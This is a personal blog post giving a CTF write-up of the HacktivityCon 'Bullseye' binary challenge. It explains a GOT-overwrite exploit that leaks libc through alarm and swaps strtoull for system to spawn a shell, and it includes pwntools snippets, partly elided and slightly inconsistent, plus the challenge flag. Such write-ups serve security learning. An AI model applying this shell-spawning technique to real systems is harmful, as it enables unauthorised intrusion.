<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Jamie Polintan ">
<meta name="description" content="It&amp;rsquo;s clear to see from the content of my blog that my expertise lies in web-based exploits. However, I have mentioned before wanting to branch out and diversify my skillset in hacking; and while I definitely have more knowledge in web exploits, I also know a thing or two about pwning. Hacktivity Con CTF was a competition that ran this month, introducing several different challenges that I sunk my teeth into." />
<meta name="keywords" content=", pwn, writeups" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://jamvie.net/posts/2020/08/hacktivitycon-ctf-bullseye/" />


    <title>
        
            HacktivityCon CTF: Bullseye :: Jam Polintan 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://jamvie.net/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://jamvie.net/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://jamvie.net/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://jamvie.net/favicon-16x16.png">
    <link rel="manifest" href="https://jamvie.net/site.webmanifest">
    <link rel="mask-icon" href="https://jamvie.net/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="https://jamvie.net/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">



<meta itemprop="name" content="HacktivityCon CTF: Bullseye">
<meta itemprop="description" content="It&rsquo;s clear to see from the content of my blog that my expertise lies in web-based exploits. However, I have mentioned before wanting to branch out and diversify my skillset in hacking; and while I definitely have more knowledge in web exploits, I also know a thing or two about pwning. Hacktivity Con CTF was a competition that ran this month, introducing several different challenges that I sunk my teeth into.">
<meta itemprop="datePublished" content="2020-08-09T18:48:52-06:00" />
<meta itemprop="dateModified" content="2020-08-09T18:48:52-06:00" />
<meta itemprop="wordCount" content="482">
<meta itemprop="image" content="https://jamvie.net/images/ghidrabullseye.png">



<meta itemprop="keywords" content="pwn,writeups," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://jamvie.net/images/ghidrabullseye.png"/>

<meta name="twitter:title" content="HacktivityCon CTF: Bullseye"/>
<meta name="twitter:description" content="It&rsquo;s clear to see from the content of my blog that my expertise lies in web-based exploits. However, I have mentioned before wanting to branch out and diversify my skillset in hacking; and while I definitely have more knowledge in web exploits, I also know a thing or two about pwning. Hacktivity Con CTF was a competition that ran this month, introducing several different challenges that I sunk my teeth into."/>



    <meta property="og:title" content="HacktivityCon CTF: Bullseye" />
<meta property="og:description" content="It&rsquo;s clear to see from the content of my blog that my expertise lies in web-based exploits. However, I have mentioned before wanting to branch out and diversify my skillset in hacking; and while I definitely have more knowledge in web exploits, I also know a thing or two about pwning. Hacktivity Con CTF was a competition that ran this month, introducing several different challenges that I sunk my teeth into." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://jamvie.net/posts/2020/08/hacktivitycon-ctf-bullseye/" />
<meta property="og:image" content="https://jamvie.net/images/ghidrabullseye.png" />
<meta property="article:published_time" content="2020-08-09T18:48:52-06:00" />
<meta property="article:modified_time" content="2020-08-09T18:48:52-06:00" />






    <meta property="article:published_time" content="2020-08-09 18:48:52 -0600 MDT" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://jamvie.net/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">$ echo &#39;hello&#39;</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://jamvie.net/about/">About Me</a></li><li><a href="https://jamvie.net/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>3 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title">
                <a href="https://jamvie.net/posts/2020/08/hacktivitycon-ctf-bullseye/">HacktivityCon CTF: Bullseye</a>
            </h1>

            

            <div class="post-content">
                <p>It&rsquo;s clear to see from the content of my blog that my expertise lies in web-based exploits. However, I have mentioned before wanting to branch out and diversify my skillset in hacking; and while I definitely have more knowledge in web exploits, I also know a thing or two about pwning. Hacktivity Con CTF was a competition that ran this month, introducing several different challenges that I sunk my teeth into. I will showcase one of them here, called &ldquo;Bullseye&rdquo;.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>Bullseye is a binary exploit challenge where we are given an executable called &ldquo;bullseye&rdquo;. Running it through ghidra, we can locate the main function - the binary isn&rsquo;t stripped:</p>

    <img src="https://jamvie.net/images/ghidrabullseye.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>We&rsquo;re allowed a single &lsquo;write&rsquo; privilege to change some aspect of the program. In pwn challenges, the goal would be to change the value in the instruction pointer - typically, common knowledge is to change the original value in the EIP register and have it take the address of the libc <code>system</code> function, allowing us to open a shell and do all sorts of things. We don&rsquo;t know where the libc location is through the global offset table, so figuring out the address of <code>system</code> will be our main issue.</p>
<p>What&rsquo;s interesting is that the main() function returns by exit() - hence why we only get one write. However, if we use our one write to change exit() to instead jump back to main in the last line, we can bypass the &ldquo;one write only&rdquo; rule, sort of making our main() function recursive.</p>
<p>Doing this, we actually get a <a href="https://www.gnu.org/software/libc/">libc</a> leak, through the function <code>alarm</code>. This is important - with this libc leak, we can solve our &ldquo;where is libc in the GOT&rdquo; question, and calculate the <code>system</code> function&rsquo;s address in memory through it.
So we now have an oppurtunity to call <code>system</code>, but what line should we replace in <code>main</code> to open our shell in?</p>
<p>Lines 16 and 20 feature a libc function called <code>strtoull</code>. The nature of <code>strtoull</code>, according to the standard lib documentation, is to take its single argument (provided its a string) and convert it to a long unsigned int. Since it expects my input, we can take advantage of that fact and replace it with our <code>system</code> calls while feeding in <code>&quot;/bin/sh&quot;</code> as our input.
We now have all the tools required to exploit this challenge.</p>
<ol>
<li>Use the program&rsquo;s functionality to change <code>exit()</code> to <code>main</code>. NOTE: I&rsquo;m using python&rsquo;s <a href="http://docs.pwntools.com/en/stable/"><code>pwn</code></a> library.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...</span>
ch<span style="color:#f92672">.</span>remote(<span style="color:#e6db74">&#34;jh2i.com&#34;</span>, <span style="color:#ae81ff">50031</span>)

ch<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;write to?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
ch<span style="color:#f92672">.</span>sendline(exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;exit&#34;</span>])
ch<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;to write?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</code></pre></div><ol start="2">
<li>Get the libc leak, and use it to calculate the base of libc.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">alarm <span style="color:#f92672">=</span> ch<span style="color:#f92672">.</span>recvline()
alarm <span style="color:#f92672">=</span> int(alarm,<span style="color:#ae81ff">16</span>)
libc_base <span style="color:#f92672">=</span> alarm <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;alarm&#39;</span>]
</code></pre></div><ol start="3">
<li>With the base of libc, calculate the address location of <code>system</code>. Send the line of <code>strtoull</code> to be replaced by <code>system</code>.</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ch<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;write to?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
ch<span style="color:#f92672">.</span>sendline(exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;strtoull&#34;</span>])
ch<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;to write?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
ch<span style="color:#f92672">.</span>sendline(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x554e0</span>)
ch<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;/bin/&#34;</span>)
</code></pre></div><ol start="5">
<li>Once we opened the shell, get the flag on their server!</li>
</ol>
<p><code>flag{one_write_two_write_good_write_bad_write}</code></p>
<p>Jam</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://jamvie.net/tags/pwn">pwn</a></span><span class="tag"><a href="https://jamvie.net/tags/writeups">writeups</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>482 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-08-09 18:48 -0600</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h"></span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    

                    
                        <span class="button next">
                            <a href="https://jamvie.net/posts/2020/07/cross-site-request-forgery-introduction/">
                                <span class="button__text">Cross-Site Request Forgery: Introduction</span>
                                <span class="button__icon">→</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
                <span><a href="https://jamvie.net">Jamie Polintan</a></span>
            
            <span>CC Attribution-NonCommercial 4.0 International License</span>
            <span> <a href="https://jamvie.net/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="https://jamvie.net/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>



    </body>
</html>
